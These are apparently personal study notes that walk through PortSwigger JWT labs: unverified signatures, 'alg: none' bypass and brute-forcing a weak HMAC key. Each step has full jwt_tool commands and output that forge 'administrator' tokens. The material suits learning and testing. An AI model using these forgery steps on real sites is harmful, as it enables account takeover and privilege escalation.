# JWT Attacks

## References

- [JWT Attacks - PortSwigger](https://portswigger.net/web-security/jwt)
- [JWT Vulnerabilities - HackTricks](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)
- [Pentest JWT Token (Playlist) - AulasHack](https://odysee.com/$/playlist/1b7dc3665c5cf1c05af4d0e56fd30d94031af8ba)

## Labs

- [JWT Vulnerabilities Labs - PortSwigger](https://portswigger.net/web-security/all-labs#jwt)

## Useful Tools

- [jwt.io](https://jwt.io/)
- [JWT Debugger](https://token.dev/)
- [jwt_tool - Github](https://github.com/ticarpi/jwt_tool)
- [JSON Web Tokens - Burp Suite Extension](https://portswigger.net/bappstore/f923cbf91698420890354c1d8958fee6)

## Resume

###  What are JWT Tokens?

​            JSON web tokens (JWTs) are a standardized format for sending cryptographically signed JSON data between systems. They can  theoretically contain any kind of data, but are most commonly used to  send information ("claims") about users as part of authentication,  session handling, and access control mechanisms.        

​            Unlike with classic session tokens, all of the data that a  server needs is stored client-side within the JWT itself. This makes  JWTs a popular choice for highly distributed websites where users need  to interact seamlessly with multiple back-end servers.        

### JWT format

​            A JWT consists of 3 parts: a header, a payload, and a signature. These are each separated by a dot, as shown in the following example:        

```
eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA
```

​            The header and payload parts of a JWT are just  base64url-encoded JSON objects. The header contains metadata about the  token itself, while the payload contains the actual "claims" about the  user. For example, you can decode the payload from the token above to  reveal the following claims:        

```json
{
  "iss": "portswigger",
  "exp": 1648037164,
  "name": "Carlos Montoya",
  "sub": "carlos",
  "role": "blog_author",
  "email": "carlos@carlos-montoya.net",
  "iat": 1516239022
}
```

​            In most cases, this data can be easily read or modified by  anyone with access to the token. Therefore, the security of any  JWT-based mechanism is heavily reliant on the cryptographic signature.        

### JWT signature

​            The server that issues the token typically generates the  signature by hashing the header and payload. In some cases, they also  encrypt the resulting hash. Either way, this process involves a secret  signing key. This mechanism provides a way for servers to verify that  none of the data within the token has been tampered with since it was  issued:        

- As the signature is directly derived from the rest  of the token, changing a single byte of the header or payload results in a mismatched signature.                
- Without knowing the server's secret signing key, it  shouldn't be possible to generate the correct signature for a given  header or payload.                

### What are JWT attacks and what are the impacts?

​            JWT attacks involve a user sending modified JWTs to the  server in order to achieve a malicious goal. Typically, this goal is to  bypass authentication and access controls by impersonating another user  who has already been authenticated.        

The impact of JWT attacks is usually severe. If an attacker is able to  create their own valid tokens with arbitrary values, they may be able to escalate their own privileges or impersonate other users, taking full  control of their accounts. 

## Vulnerabilities

### JWT authentication bypass via unverified signature

**Resources:**

- **Lab:** https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature
- **AulasHack Video Resolution:** https://odysee.com/@AulasHack:4/jwt-authentication-bypass-via-unverified:6?lid=1b7dc3665c5cf1c05af4d0e56fd30d94031af8ba

**Explanation:** 

​	By design, servers don't usually store any information about the JWTs that they issue. Instead, each token is an entirely  self-contained entity. This has several advantages, but also introduces a fundamental problem - the server doesn't actually know anything about  the original contents of the token, or even what the original signature  was. Therefore, if the server doesn't verify the signature properly,  there's nothing to stop an attacker from making arbitrary changes to the rest of the token.        

​	For example, consider a JWT containing the following claims:        

```json
{    
	"username": "carlos",    
	"isAdmin": false 
}
```

​	If the server identifies the session based on this `username`, modifying its value might enable an attacker to impersonate other logged-in users. Similarly, if the `isAdmin` value is used for access control, this could provide a simple vector for privilege escalation.        

​	In the first couple of labs, you'll see some examples of how these vulnerabilities might look in real-world applications.       

**Resolution:**

1. Login at **wiener** account, collect and analyse the JWT Tokent at **jwt.io** or **jwt_tool**.

```bash
└─$ python3 jwt_tool.py eyJraWQiOiI3YTQ4NjQ2YS0yMTgwLTRkOGUtYTA1YS00MjJhOTlkOWFjNzEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDQyNTc4Nywic3ViIjoid2llbmVyIn0.cGCHsE9vb_hFeQQ47dlwUqBZd6jlzjoyGMKxFVGvKLh3WKG42j0JiPCDJU5be97aMdzFXcw2FfWwQdBMWbeSVBouqy4Hep5FeI9K5XfyA-tOpSYkbLZlyslRsnyOmb1VokHOrhJpHNdWSUK94fvQMuyucw832oJmi1Z7voKkjHCPpyIywHy8MCOYz0xzB7BNteZviV776Seo_OA5hJT4y2r-Iur7hkyHXhVlU4ORWx62hQb546aIdzRuQDbh1zbzvOmiVlySuwZgNfT_56Uh2i-JTo18AjadGrTD0ZIIG2aGnjAD0ZZkaK6LvDaI6lR_NyJteJJQR54ffC17KoibJg   

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi      

Original JWT: 
                                                                                                                                                                                             
=====================
Decoded Token Values:                                                                                                                                                                        
=====================                                                                                                                                                                        

Token header values:                                                                                                                                                                         
[+] kid = "7a48646a-2180-4d8e-a05a-422a99d9ac71"
[+] alg = "RS256"

Token payload values:                                                                                                                                                                        
[+] iss = "portswigger"
[+] exp = 1714425787    ==> TIMESTAMP = 2024-04-29 18:23:07 (UTC)
[+] sub = "wiener"

----------------------                                                                                                                                                                       
JWT common timestamps:                                                                                                                                                                       
iat = IssuedAt                                                                                                                                                                               
exp = Expires                                                                                                                                                                                
nbf = NotBefore                                                                                                                                                                              
----------------------
```

2. Tamper "wiener" value to the "administrator" value using **jwt_tool** or other tool (JSON Web Tokens - Burp Suite Extension, JWT debugger, etc).

```bash
─$ python3 jwt_tool.py eyJraWQiOiI3YTQ4NjQ2YS0yMTgwLTRkOGUtYTA1YS00MjJhOTlkOWFjNzEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDQyNDQzMiwic3ViIjoid2llbmVyIn0.E_zbMx5P-9T3BbNH8klnEapTlbYpRcYe88NJURL-RM96BSYdnxTZJYhwmcN6lFND_Gj8SijMtBVqWBOmyCE6Mo1Qd58qRwE_tgmBNRAQNexXE1FwjQIBiof0rS_sdoP9D8oTqvTNHy80Wn1YLaB6pdah1yQnl7gTU8mfTolD0dyxVjwUyPjm3OJ7AbPQQYSfPVj93p2VXevDBTSikLphB7_OiiE8ywJSLCAu7_qX2TK0c31RVLjGrPlw-f5Ec3MYEjIY_GAJHMXflgmhCW83Z6AjDmhiClhVEfZ8v1bPQ0m1dUegMHTV7_RwaPanrBmai7EtB_P_OjocF8jwCUu2fg -T

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi      

Original JWT: 
                                                                                                                                                                                             

====================================================================                                                                                                                         
This option allows you to tamper with the header, contents and                                                                                                                               
signature of the JWT.                                                                                                                                                                        
====================================================================                                                                                                                         

Token header values:                                                                                                                                                                         
[1] kid = "7a48646a-2180-4d8e-a05a-422a99d9ac71"
[2] alg = "RS256"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:                                                                                                                                                                
(or 0 to Continue)                                                                                                                                                                           
> 0

Token payload values:                                                                                                                                                                        
[1] iss = "portswigger"
[2] exp = 1714424432    ==> TIMESTAMP = 2024-04-29 18:00:32 (UTC)
[3] sub = "wiener"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:                                                                                                                                                                
(or 0 to Continue)                                                                                                                                                                           
> 4
Please enter new Key and hit ENTER
> sub
Please enter new value for sub and hit ENTER
> administrator
[1] iss = "portswigger"
[2] exp = 1714424432    ==> TIMESTAMP = 2024-04-29 18:00:32 (UTC)
[3] sub = "administrator"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:                                                                                                                                                                
(or 0 to Continue)                                                                                                                                                                           
> 0
Signature unchanged - no signing method specified (-S or -X)
jwttool_084845f9c257880a92a7af8fae9224c1 - Tampered token:
[+] eyJraWQiOiI3YTQ4NjQ2YS0yMTgwLTRkOGUtYTA1YS00MjJhOTlkOWFjNzEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDQyNDQzMiwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.E_zbMx5P-9T3BbNH8klnEapTlbYpRcYe88NJURL-RM96BSYdnxTZJYhwmcN6lFND_Gj8SijMtBVqWBOmyCE6Mo1Qd58qRwE_tgmBNRAQNexXE1FwjQIBiof0rS_sdoP9D8oTqvTNHy80Wn1YLaB6pdah1yQnl7gTU8mfTolD0dyxVjwUyPjm3OJ7AbPQQYSfPVj93p2VXevDBTSikLphB7_OiiE8ywJSLCAu7_qX2TK0c31RVLjGrPlw-f5Ec3MYEjIY_GAJHMXflgmhCW83Z6AjDmhiClhVEfZ8v1bPQ0m1dUegMHTV7_RwaPanrBmai7EtB_P_OjocF8jwCUu2fg
```

3. Use Tampered JWT to access "/admin" page.

<img align="center" src="screenshots/jwt_vulns/unverified_signature/not_tampered.png">

<img align="center" src="screenshots/jwt_vulns/unverified_signature/tampered.png">

### JWT authentication bypass via flawed signature verification

**Resources:**

- **Lab:** https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification
- **AulasHack Video Resolution:** https://odysee.com/@AulasHack:4/jwt-authentication-bypass-via-flawed:5?lid=1b7dc3665c5cf1c05af4d0e56fd30d94031af8ba

**Explanation:** 

​	Among other things, the JWT header contains an `alg` parameter. This tells the server which algorithm was used to sign the  token and, therefore, which algorithm it needs to use when verifying the signature.        

```json
{
    "alg": "HS256",
    "typ": "JWT"
}
```

​	This is inherently flawed because the server has no option  but to implicitly trust user-controllable input from the token which, at this point, hasn't been verified at all. In other words, an attacker  can directly influence how the server checks whether the token is  trustworthy.        

​	JWTs can be signed using a range of different algorithms, but can also be left unsigned. In this case, the `alg` parameter is set to `none`, which indicates a so-called "unsecured JWT". Due to the obvious dangers of this, servers usually reject tokens with no signature. However, as  this kind of filtering relies on string parsing, you can sometimes  bypass these filters using classic obfuscation techniques, such as mixed capitalization and unexpected encodings.        

**Resolution:**

1. Login at **wiener** account, collect and analyse the JWT Token at **jwt.io** or **jwt_tool**.

```bash
└─$ python3 jwt_tool.py eyJraWQiOiJkNzVjMTA3Ni1iYmJjLTRmMDgtODI4Yy1hYTVhZjU2MDU0NTAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDY1OTg5Miwic3ViIjoid2llbmVyIn0.HoAC4UXD5StehdSUdCyn6mTcsANbR_29e8DtVbMps_ARWEo4U8ZpfPmbAqyLh4skGdnldsX2nTh-x9q72kyFmrLPmAgzBKc0N8FMKDl8zI3S5wsEK8AtCu5OsVZRL0G0idIzzzQVvZRmQVTBDCs5TghXzN3uQt5uOtX6oznYIcBM__85YlZASa_TbeQznwcZsatoKltasz22hHBcxInTvafePEZHHd7FecLQZjsO3L5jYSlos2AVhtCeGZWYi3MgY6qO83celfHmLumFjClIM17pNYH5GPoPMaFHyt7u_Ula8rrGbqRYstlt6k5rM10-BResgfLuWS7RNr2bT6MIYg   

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi      

Original JWT: 

=====================
Decoded Token Values:
=====================

Token header values:
[+] kid = "d75c1076-bbbc-4f08-828c-aa5af5605450"
[+] alg = "RS256"

Token payload values:
[+] iss = "portswigger"
[+] exp = 1714659892    ==> TIMESTAMP = 2024-05-02 11:24:52 (UTC)
[+] sub = "wiener"

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
```

2. Tamper the "wiener" value to the "administrator" value using **jwt_tool** or other tool (JSON Web Tokens - Burp Suite Extension, JWT debugger, etc).

```bash
└─$ python3 jwt_tool.py eyJraWQiOiJkNzVjMTA3Ni1iYmJjLTRmMDgtODI4Yy1hYTVhZjU2MDU0NTAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDY1OTg5Miwic3ViIjoid2llbmVyIn0.HoAC4UXD5StehdSUdCyn6mTcsANbR_29e8DtVbMps_ARWEo4U8ZpfPmbAqyLh4skGdnldsX2nTh-x9q72kyFmrLPmAgzBKc0N8FMKDl8zI3S5wsEK8AtCu5OsVZRL0G0idIzzzQVvZRmQVTBDCs5TghXzN3uQt5uOtX6oznYIcBM__85YlZASa_TbeQznwcZsatoKltasz22hHBcxInTvafePEZHHd7FecLQZjsO3L5jYSlos2AVhtCeGZWYi3MgY6qO83celfHmLumFjClIM17pNYH5GPoPMaFHyt7u_Ula8rrGbqRYstlt6k5rM10-BResgfLuWS7RNr2bT6MIYg -T

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi      

Original JWT: 


====================================================================
This option allows you to tamper with the header, contents and 
signature of the JWT.
====================================================================

Token header values:
[1] kid = "d75c1076-bbbc-4f08-828c-aa5af5605450"
[2] alg = "RS256"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] iss = "portswigger"
[2] exp = 1714659892    ==> TIMESTAMP = 2024-05-02 11:24:52 (UTC)
[3] sub = "wiener"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:                                                                                                                                                                
(or 0 to Continue)                                                                                                                                                                           
> 4
Please enter new Key and hit ENTER
> sub
Please enter new value for sub and hit ENTER
> administrator
[1] iss = "portswigger"
[2] exp = 1714659892    ==> TIMESTAMP = 2024-05-02 11:24:52 (UTC)
[3] sub = "administrator"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:                                                                                                                                                                
(or 0 to Continue)                                                                                                                                                                           
> 0
Signature unchanged - no signing method specified (-S or -X)
jwttool_792407c24f2de96f70e50f012694fad2 - Tampered token:
[+] eyJraWQiOiJkNzVjMTA3Ni1iYmJjLTRmMDgtODI4Yy1hYTVhZjU2MDU0NTAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDY1OTg5Miwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.HoAC4UXD5StehdSUdCyn6mTcsANbR_29e8DtVbMps_ARWEo4U8ZpfPmbAqyLh4skGdnldsX2nTh-x9q72kyFmrLPmAgzBKc0N8FMKDl8zI3S5wsEK8AtCu5OsVZRL0G0idIzzzQVvZRmQVTBDCs5TghXzN3uQt5uOtX6oznYIcBM__85YlZASa_TbeQznwcZsatoKltasz22hHBcxInTvafePEZHHd7FecLQZjsO3L5jYSlos2AVhtCeGZWYi3MgY6qO83celfHmLumFjClIM17pNYH5GPoPMaFHyt7u_Ula8rrGbqRYstlt6k5rM10-BResgfLuWS7RNr2bT6MIYg
```

3. Modify algorithm value to `none` and execute **Alg None Attack**. To ease the attack, use **jwt_tool** or **JSON Web Tokens - Burp Suite Extension**.

```bash
└─$ python3 jwt_tool.py eyJraWQiOiJhZmM1YWZhMS01NzNiLTQ4OWUtOGUzNS1kODc4MjcyZTRkZGMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDY2Mzg0MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.GrLn6PklK2eglXqev8LIv-deNMePTMj0nd3Ex-UNFEMhPvq2ckztksxgZ02VFAoPqX3wNFiR6qXYCi_PV9WT9GKGyZHll4TNfXgwWQpCx4OjM4-v_6380LIjGlzlrYn3hsRCqcxqojEQhllC5kxbyTNcGc-ENwjBO1TnHNAMNrW5Nltp6EczatfDRJT0X44b1Q1ESpMQVZ7WCXpVXW4y8Lbxyk0bLk89E_gjPvPebaC4z8IWyKM9WdJjHPsGccpIpH8DOeXt2KMqD10SnwS1X9fYW99gfoMRyPY2bXKktcCytKTqfsg3qT5SopkGQymq2aidW-Kn6pauSTyYW6t1hw -X a

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi      

Original JWT: 
                                                                                                                                                                                             
jwttool_88615071d0e4c7ac5feeaee16aa23f6a - EXPLOIT: "alg":"none" - this is an exploit targeting the debug feature that allows a token to have no signature
(This will only be valid on unpatched implementations of JWT.)                                                                                                                               
[+] eyJraWQiOiJhZmM1YWZhMS01NzNiLTQ4OWUtOGUzNS1kODc4MjcyZTRkZGMiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDY2Mzg0MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
jwttool_6917827a302d58b0145a13ba94deaa28 - EXPLOIT: "alg":"None" - this is an exploit targeting the debug feature that allows a token to have no signature
(This will only be valid on unpatched implementations of JWT.)                                                                                                                               
[+] eyJraWQiOiJhZmM1YWZhMS01NzNiLTQ4OWUtOGUzNS1kODc4MjcyZTRkZGMiLCJhbGciOiJOb25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDY2Mzg0MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
jwttool_a3224fc3744cf87c54c698f91e6004a5 - EXPLOIT: "alg":"NONE" - this is an exploit targeting the debug feature that allows a token to have no signature
(This will only be valid on unpatched implementations of JWT.)                                                                                                                               
[+] eyJraWQiOiJhZmM1YWZhMS01NzNiLTQ4OWUtOGUzNS1kODc4MjcyZTRkZGMiLCJhbGciOiJOT05FIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDY2Mzg0MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
jwttool_f25032c0bc069765db80fd58114b1910 - EXPLOIT: "alg":"nOnE" - this is an exploit targeting the debug feature that allows a token to have no signature
(This will only be valid on unpatched implementations of JWT.)                                                                                                                               
[+] eyJraWQiOiJhZmM1YWZhMS01NzNiLTQ4OWUtOGUzNS1kODc4MjcyZTRkZGMiLCJhbGciOiJuT25FIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDY2Mzg0MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
```

<img align="center" src="screenshots/jwt_vulns/flawed_signature_verificaion/alg_none_burp.png">

<img align="center" src="screenshots/jwt_vulns/flawed_signature_verificaion/alg_none_success.png">

### JWT authentication bypass via weak signing key

**Resources:**

- **Lab:** https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key
- **AulasHack Video Resolution:** https://odysee.com/@AulasHack:4/jwt-authentication-bypass-via-weak:0?lid=1b7dc3665c5cf1c05af4d0e56fd30d94031af8ba

**Explanation:** 

​	Some signing algorithms, such as HS256 (HMAC + SHA-256), use an arbitrary, standalone string as the secret key. Just like a  password, it's crucial that this secret can't be easily guessed or  brute-forced by an attacker. Otherwise, they may be able to create JWTs  with any header and payload values they like, then use the key to  re-sign the token with a valid signature.        

​	When implementing JWT applications, developers sometimes  make mistakes like forgetting to change default or placeholder secrets.  They may even copy and paste code snippets they find online, then forget to change a hardcoded secret that's provided as an example. In this  case, it can be trivial for an attacker to brute-force a server's secret using a [wordlist of well-known secrets](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list).         

**NOTE:** To brute force the secret key you can use **Hashcat**, **jwt_tool**, etc.

**Resolution:**

1. Login at **wiener** account, collect and bruteforce JWT Token using **jwt_tool** or **hashcat**.

```bash
python3 jwt_tool.py eyJraWQiOiJjMmFlZWMzNy02MDZkLTRmMjUtOTQwOC0xNWU2ZWMzNWYzOGQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDkyMTA3OSwic3ViIjoid2llbmVyIn0.mks-KRNmV4JalJkcOTJO7fPbJnV4Xp7o5imU4_T3bls -C -d /usr/share/wordlists/rockyou.txt

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi      

Original JWT: 

[+] secret1 is the CORRECT key!
You can tamper/fuzz the token contents (-T/-I) and sign it using:
python3 jwt_tool.py [options here] -S hs256 -p "secret1"
```

2. Tamper the "wiener" value to the "administrator" value and sign the JWT using the secret found. To ease the attack, use **jwt_tool**.

```bash
└─$ python3 jwt_tool.py eyJraWQiOiJjMmFlZWMzNy02MDZkLTRmMjUtOTQwOC0xNWU2ZWMzNWYzOGQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDkyMTA3OSwic3ViIjoid2llbmVyIn0.mks-KRNmV4JalJkcOTJO7fPbJnV4Xp7o5imU4_T3bls -T -S hs256 -p "secret1"              

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi      

Original JWT: 


====================================================================                                                                                                                         
This option allows you to tamper with the header, contents and                                                                                                                               
signature of the JWT.                                                                                                                                                                        
====================================================================                                                                                                                         

Token header values:                                                                                                                                                                         
[1] kid = "c2aeec37-606d-4f25-9408-15e6ec35f38d"
[2] alg = "HS256"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:                                                                                                                                                                
(or 0 to Continue)                                                                                                                                                                           
> 0

Token payload values:                                                                                                                                                                        
[1] iss = "portswigger"
[2] exp = 1714921079    ==> TIMESTAMP = 2024-05-05 11:57:59 (UTC)
[3] sub = "wiener"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:                                                                                                                                                                
(or 0 to Continue)                                                                                                                                                                           
> 4
Please enter new Key and hit ENTER
> sub
Please enter new value for sub and hit ENTER
> administrator
[1] iss = "portswigger"
[2] exp = 1714921079    ==> TIMESTAMP = 2024-05-05 11:57:59 (UTC)
[3] sub = "administrator"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:                                                                                                                                                                
(or 0 to Continue)                                                                                                                                                                           
> 0
jwttool_4552467d0649097eae708c85922f4c7a - Tampered token - HMAC Signing:
[+] eyJraWQiOiJjMmFlZWMzNy02MDZkLTRmMjUtOTQwOC0xNWU2ZWMzNWYzOGQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNDkyMTA3OSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.gwQR6BeYFCPy7UR7VMd2_I4QHPGvoFJP8AxUDzdqVss
```

3. Use Burp Repeater to access "admin" page.

<img align="center" src="screenshots/jwt_vulns/weak_signing_key/tamp_jwt.png">